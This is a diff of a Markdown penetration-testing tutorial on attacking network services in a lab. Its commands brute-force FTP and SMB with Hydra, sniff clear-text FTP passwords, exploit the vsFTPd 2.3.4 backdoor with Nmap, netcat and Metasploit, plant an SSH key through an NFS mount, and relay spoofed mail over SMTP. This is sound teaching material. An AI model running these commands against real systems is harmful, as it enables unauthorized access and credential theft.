@@ -1,234 +1,327 @@
-🛡️ Network Protocols & Pentesting Guide
-📍 Nmap
-Nmap (Network Mapper) is a top open-source tool used for network scanning and security auditing.
-It can save scan results in multiple formats for later analysis.
+### Network protocols allow devices to communicate and exchange data over a network. Here’s an expanded explanation of some commonly used protocols in penetration testing:
 
-📂 FTP (File Transfer Protocol)
-FTP is a client-server protocol that transfers files over TCP (Ports 20/21).
-It uses:
+### **1. FTP (File Transfer Protocol)**
 
-Command Channel: Controls conversation.
+- **Port:** 21 (TCP)
+- **Function:** FTP is used for transferring files between a client and a server. FTP operates over two channels:
+    - **Control channel** (for sending commands)
+    - **Data channel** (for transferring the actual files).
+- **Common Security Issues:**
+    - **Anonymous login:** Some FTP servers are misconfigured to allow anonymous logins, providing unauthorized access to files.
+    - **Clear-text credentials:** FTP sends usernames and passwords in clear text, making it vulnerable to sniffing attacks.
 
-Data Channel: Transfers files.
+---
 
-📋 Penetration Testing on FTP
-<details> <summary><strong>Anonymous Login</strong></summary>
+### **1.1. Penetration Testing on FTP**
+
+### **1.1.1. Anonymous Login**
+
+When performing penetration testing, an attacker can attempt to log in using **anonymous credentials** if the FTP server allows it. Many misconfigured FTP servers allow anonymous access for easier file sharing, which is a security risk.
+
+**Example FTP login attempt:**
+
+```bash
 bash
-Copy
-Edit
+CopyEdit
 ftp 192.168.188.131
 Name: Anonymous
 Password: Anonymous
-🎯 Successful login places you inside the FTP server.
 
-</details> <details> <summary><strong>Sniffing FTP Credentials</strong></summary>
-Since FTP sends credentials unencrypted, use Wireshark to capture cleartext login info:
+```
 
+If the server allows anonymous login, you will be able to interact with the server and explore its contents.
+
+---
+
+### **1.1.2. Sniffing FTP Credentials (Clear-text Passwords)**
+
+Because FTP doesn’t encrypt traffic, usernames and passwords are sent in clear text. An attacker can use sniffing tools to capture this data, which can be used to compromise the server.
+
+- **Wireshark:** A tool that can capture network packets and allow an attacker to see the FTP credentials.
+
+**How to sniff credentials:**
+
+1. **Start an FTP session**:
+    
+    ```bash
+    bash
+    CopyEdit
+    ftp 192.168.188.131
+    
+    ```
+    
+2. **Capture the traffic using Wireshark.**
+3. **Follow the TCP stream** to see the credentials:
+    - Look for packets containing the string `"PASS"` in Wireshark, which indicates the password being sent.
+
+**Example of clear-text credentials:**
+
+```
+plaintext
+CopyEdit
+USER anonymous
+PASS anonymous
+
+```
+
+---
+
+### **1.1.3. FTP Brute-Force Attack (Hydra)**
+
+**Hydra** is a popular tool for performing brute-force attacks against various services, including FTP. It can attempt multiple combinations of usernames and passwords to gain unauthorized access.
+
+**Example of brute-forcing FTP login:**
+
+```bash
 bash
-Copy
-Edit
-frame contains "PASS"
-Follow TCP stream to view username/password.
-
-</details> <details> <summary><strong>Bruteforce FTP using Hydra</strong></summary>
-bash
-Copy
-Edit
+CopyEdit
 hydra -L user -P pass 192.168.188.131 ftp
 hydra -L wordlist.txt -P wordlist.txt 192.168.188.131 ftp
-🛠 Hydra supports many protocols beyond FTP too!
 
-</details> <details> <summary><strong>Exploit FTP Backdoor (vsftpd)</strong></summary>
+```
+
+- **L** specifies a file with usernames.
+- **P** specifies a file with passwords.
+- **ftp** is the target protocol.
+
+The **wordlist** file contains a list of possible usernames or passwords to be tried. A strong wordlist (such as **rockyou.txt**) increases the chance of success.
+
+---
+
+### **1.1.4. FTP Remote Shell via Nmap Script**
+
+You can also use **Nmap** to exploit specific vulnerabilities in FTP servers. The `ftp-vsftpd-backdoor.nse` script is designed to exploit a vulnerability in **vsFTPd 2.3.4**, which contains a backdoor.
+
+**Example Nmap command to check for the backdoor:**
+
+```bash
 bash
-Copy
-Edit
+CopyEdit
 sudo nmap -p 21 192.168.188.131 -sV --script ftp-vsftpd-backdoor.nse
-Connect manually:
 
-bash
-Copy
-Edit
-nc 192.168.188.131 21
-USER yourname:)
-PASS yourname
-Spawn remote shell:
+```
 
-bash
-Copy
-Edit
-nc 192.168.188.131 6200
-whoami
-python -c 'import pty; pty.spawn("/bin/bash")'
-</details> <details> <summary><strong>Exploiting vsFTPd 2.3.4 with Metasploit</strong></summary>
-bash
-Copy
-Edit
-msfconsole
-search vsftpd 2.3.4
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOST 192.168.188.131
-exploit
-Post-Exploitation:
+This will test if the FTP server is vulnerable to the **vsFTPd backdoor**. If the server is vulnerable, you may be able to execute commands remotely.
 
-bash
-Copy
-Edit
-python -c 'import pty; pty.spawn("/bin/bash")'
-find / -iname user.txt -exec wc {} \;
-</details>
-📦 NFS (Network File System)
-NFS allows remote mounting of filesystems over a network.
+---
 
-<details> <summary><strong>Enumerating NFS Shares</strong></summary>
-bash
-Copy
-Edit
-nmap -p 2049 -sV 192.168.188.131
-Or:
+### **1.1.5. Exploiting FTP Vulnerabilities with Metasploit**
 
-bash
-Copy
-Edit
-sudo nmap 192.168.188.137 --script nfs-showmount
-</details> <details> <summary><strong>Mounting & Exploiting NFS Shares</strong></summary>
-Mounting:
+Metasploit is another powerful tool used for exploiting vulnerabilities in systems. If the FTP server is running a vulnerable version of vsFTPd (e.g., **vsFTPd 2.3.4**), Metasploit can be used to exploit it.
 
+**Steps to exploit vsFTPd 2.3.4 with Metasploit:**
+
+1. **Search for the exploit:**
+    
+    ```bash
+    bash
+    CopyEdit
+    msfconsole
+    search vsftpd 2.3.4
+    
+    ```
+    
+2. **Use the exploit:**
+    
+    ```bash
+    bash
+    CopyEdit
+    use exploit/unix/ftp/vsftpd_234_backdoor
+    set RHOST 192.168.188.131
+    exploit
+    
+    ```
+    
+3. **Interact with the remote shell:**
+    
+    ```bash
+    bash
+    CopyEdit
+    python -c 'import pty; pty.spawn("/bin/bash")'
+    
+    ```
+    
+
+By exploiting this vulnerability, you can get access to the **root** account on the target machine.
+
+---
+
+### **2. NFS (Network File System)**
+
+NFS allows a system to share its files with other systems over a network. It enables the mounting of remote file systems and interaction with them as if they were local.
+
+**Example Nmap command to scan for NFS services:**
+
+```bash
 bash
-Copy
-Edit
+CopyEdit
+nmap -p2049 -sV 192.168.188.131
+
+```
+
+If NFS is exposed publicly, it can be mounted to the local machine and files can be accessed.
+
+**Mounting NFS share:**
+
+```bash
+bash
+CopyEdit
 sudo mount 192.168.188.131:/ /home/kali/Downloads/nfs -nolock
-Mounting with specific NFS version:
 
+```
+
+This allows you to access shared files from the remote NFS server.
+
+**Troubleshooting NFS Mount Permission Issues:**
+
+If you encounter **Permission Denied**, ensure that you have the correct NFS version and permissions configured.
+
+**To use NFSv3 (if needed):**
+
+```bash
 bash
-Copy
-Edit
+CopyEdit
 sudo mount -t nfs -o vers=3 192.168.188.137:/home/vulnix /home/kali/Downloads/nfs/home/vulnix -nolock
-Create a matching user:
 
+```
+
+---
+
+### **3. SMB (Server Message Block)**
+
+SMB is a protocol used for file and printer sharing, as well as inter-process communication between computers.
+
+**Example Nmap command to scan for SMB services:**
+
+```bash
 bash
-Copy
-Edit
-sudo groupadd --gid 2008 vulnix_group
-sudo useradd --uid 2008 --groups vulnix_group vulnix
-Generate SSH keys and push:
+CopyEdit
+sudo nmap -p 445 -sV -sC 192.168.188.131
 
+```
+
+**Enumerating SMB Shares:**
+
+```bash
 bash
-Copy
-Edit
-ssh-keygen -t rsa -b 4096
-cat ~/.ssh/id_rsa.pub | sudo -u vulnix tee -a vulnix/.ssh/authorized_keys
-Login:
-
-bash
-Copy
-Edit
-ssh vulnix@192.168.188.137
-</details>
-🗂️ SMB (Server Message Block)
-SMB is used for file/printer sharing, operating over port 445.
-
-<details> <summary><strong>Enumerating SMB Shares</strong></summary>
-bash
-Copy
-Edit
-nmap -p 445 -sV -sC 192.168.188.131
-
+CopyEdit
 enum4linux -L -S 192.168.188.131
-smbclient -L \\192.168.188.131 -N
+smbclient -L 192.168.188.131 -N
 smbmap -H 192.168.188.131
-</details> <details> <summary><strong>Exploiting SMB Vulnerabilities</strong></summary>
-Samba 3.0.20 RCE:
 
-bash
-Copy
-Edit
-searchsploit samba 3.0.20
-Anonymous SMB Access:
+```
 
-bash
-Copy
-Edit
-smbclient --no-pass //192.168.188.131/tmp
-</details>
-🔌 RPC (Remote Procedure Call)
-RPC allows running procedures on remote machines.
+**Brute-forcing SMB credentials:**
 
-<details> <summary><strong>Connecting to RPC</strong></summary>
+```bash
 bash
-Copy
-Edit
+CopyEdit
+hydra -l admin -P /home/kali/pass.txt smb://192.168.188.131
+
+```
+
+---
+
+### **4. RPC (Remote Procedure Call)**
+
+RPC allows a program on one computer to execute a procedure on another computer.
+
+**Enumerating with RPCClient:**
+
+```bash
+bash
+CopyEdit
 rpcclient 192.168.188.131 -U ''
-Commands:
+$> srvinfo
+$> enumdomusers
 
+```
+
+This will provide information about the target system and its users.
+
+---
+
+### **5. SNMP (Simple Network Management Protocol)**
+
+SNMP is used to manage and monitor network devices. It can be exploited if the community string is weak or known (like **public** or **private**).
+
+**Example SNMP enumeration with `snmpcheck`:**
+
+```bash
 bash
-Copy
-Edit
-srvinfo         # Server info
-enumdomusers    # Enumerate users
-</details>
-📡 SNMP (Simple Network Management Protocol)
-SNMP allows network device monitoring over UDP 161.
+CopyEdit
+snmpcheck -c public -h 192.168.188.131
 
-<details> <summary><strong>SNMP Enumeration</strong></summary>
-Enumerate:
+```
 
+**Brute-forcing SNMP community strings:**
+
+```bash
 bash
-Copy
-Edit
-snmpwalk -v1 -c public 192.168.146.156
-snmpcheck -t 192.168.146.156
-Bruteforce Community Strings:
-
-bash
-Copy
-Edit
+CopyEdit
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.146.156
-</details>
-📚 LDAP (Lightweight Directory Access Protocol)
-LDAP manages user and system directories centrally.
 
-<details> <summary><strong>LDAP Enumeration</strong></summary>
+```
+
+---
+
+### **6. LDAP (Lightweight Directory Access Protocol)**
+
+LDAP is a protocol used to access and maintain directory information. It is commonly used for managing user information and authentication.
+
+**Enumerating LDAP:**
+
+```bash
 bash
-Copy
-Edit
+CopyEdit
 ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com"
-ldapwhoami -x -H ldap://<IP>
-nmap -p 389 --script ldap-search <IP>
-Metasploit:
 
+```
+
+You can also enumerate users and gather information from LDAP directories.
+
+**Using Metasploit for LDAP enumeration:**
+
+```bash
 bash
-Copy
-Edit
+CopyEdit
+msfconsole
 use auxiliary/gather/ldap_query
 set RHOSTS <IP>
+set BASE "dc=example,dc=com"
 run
-</details>
-🔒 SSH (Secure Shell)
-SSH enables encrypted remote login.
 
-<details> <summary><strong>SSH Key Authentication</strong></summary>
-Generate keys:
+```
 
+---
+
+### **7. SMTP (Simple Mail Transfer Protocol)**
+
+SMTP is used for sending and receiving emails. It can be exploited in cases of misconfiguration, such as **open relay** or **user enumeration**.
+
+**Enumerating SMTP:**
+
+```bash
 bash
-Copy
-Edit
-ssh-keygen
-Push public key to server:
+CopyEdit
+smtp-user-enum -M VRFY -U usernames.txt -t <IP>
 
+```
+
+This can be used to find valid email addresses on the target system.
+
+**Exploiting Open Relay (sending emails):**
+
+```bash
 bash
-Copy
-Edit
-cat ~/.ssh/id_rsa.pub | ssh user@server "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
-Connect:
+CopyEdit
+telnet <IP> 25
+HELO attacker.com
+MAIL FROM: attacker@attacker.com
+RCPT TO: victim@victim.com
+DATA
+Subject: Test
+This is a test email.
+.
 
-bash
-Copy
-Edit
-ssh user@server
-</details>
-🎯 Final Tips
-Always analyze Nmap output carefully.
-
-Use scripts and tools (hydra, enum4linux, smbclient, etc.) effectively.
-
-Check for version vulnerabilities (services like SMB, FTP, NFS).
+```
